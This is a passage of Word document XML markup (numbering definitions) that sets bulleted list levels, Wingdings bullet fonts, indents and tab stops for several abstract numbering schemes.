      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="74AA2D9E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="8EC80BDA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="E67E2F46" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="047EC682" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="F976C2B6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="33">
    <w:nsid w:val="11D7271B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C5A2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3235F78"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A3B8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3677BF8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3DB6BF5C"/>
    <w:lvl w:ilvl="0" w:tplc="C1D21B14">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="2B0E41D4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="CFEC1B58" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="729C5802" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="A9A6BC4A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="16AAF27A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="BD620470" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="A3E86B92" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="23E42812" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="36">
    <w:nsid w:val="13E84E10"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="251E4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3F66DC2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="035A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40D7784"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B8E2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142460C7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EAE88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4467795"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AE429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4D4392B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BEB4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176D5FD2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="73BC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7E30938"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BB0A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A4D2C49"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3858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C7E381D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F918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1CA06664"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="885A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1CF04F22"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0EB2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D660205"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3C3E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DD648D2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C3E2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DDE74C0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6186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1E03176D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AB4A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E183573"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5114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F593E80"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EB7C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0150B3A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DD9E8036"/>
    <w:lvl w:ilvl="0" w:tplc="0A0E1E82">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="A9162780">
      <w:start w:val="3677"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A0FC65B4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="0BA2B1E0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="70D0655C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="E59044D2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="83527A3C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="EA38FA62" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="3D7AD648" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="55">
    <w:nsid w:val="204358E0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9D60E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1265C0C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0D04A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14518B0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B8BE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22560488"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2E22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25D0FFE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4CC4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23385CC2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B3B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23844975"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A71A294C"/>
    <w:lvl w:ilvl="0" w:tplc="CA581AF8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="0CAEB952" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="26F29680" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="28EC5028" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="618EF20A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="F4BA2E96" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="B3AA3254" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="27D68612" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="DC6E10A0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="62">
    <w:nsid w:val="23BD30EA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="88B0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242C72E9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2EC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7261971"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9A1C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7BD2E12"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="59C4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27C26CFF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5EB6F91A"/>
    <w:lvl w:ilvl="0" w:tplc="EB0A9D88">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="E9E6C858" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="6B4E11EC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="032278CE" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="03B8191E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="F18A0232" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="ABF8EA60" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="FDFE85B6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="1C508DEE" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="67">
    <w:nsid w:val="286F6E36"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BC8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95431F5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9084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29572785"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9B2A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9666315"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DC46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29A85BC1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="77D6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A5126EB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="85CC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A651E6E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="57282FB2"/>
    <w:lvl w:ilvl="0" w:tplc="8880F742">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74">
    <w:nsid w:val="2D08470F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7694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D9315C6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0E78570E"/>
    <w:lvl w:ilvl="0" w:tplc="335A92CC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="0EC88E86" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="3BD25466" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="4E1AB9F4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="3FB463C4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="B0D6ABD0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="D6F61DF6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="A9BABB78" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
